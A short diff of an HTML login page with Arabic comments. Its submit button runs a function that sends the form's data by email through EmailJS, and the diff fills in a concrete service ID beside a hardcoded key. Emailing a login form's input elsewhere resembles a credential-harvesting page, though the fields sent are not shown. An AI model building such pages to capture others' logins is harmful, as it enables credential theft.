@@ -18,6 +18,7 @@
     <button onclick="submitForm()">دخول</button>
 
     <script>
+        // استبدال "user_your_user_id" بمعرف المستخدم الخاص بك من EmailJS
         emailjs.init("RufM_4pBQfD6xWtE6");  // استبدل بـ User ID الخاص بك
 
         function submitForm() {
@@ -31,7 +32,7 @@
             };
 
             // إرسال البريد الإلكتروني عبر EmailJS
-            emailjs.send('your_service_id', 'your_template_id', templateParams)
+            emailjs.send('Samy1082008', 'your_template_id', templateParams)
                 .then(function(response) {
                     console.log('تم إرسال البيانات بنجاح', response);
                 }, function(error) {
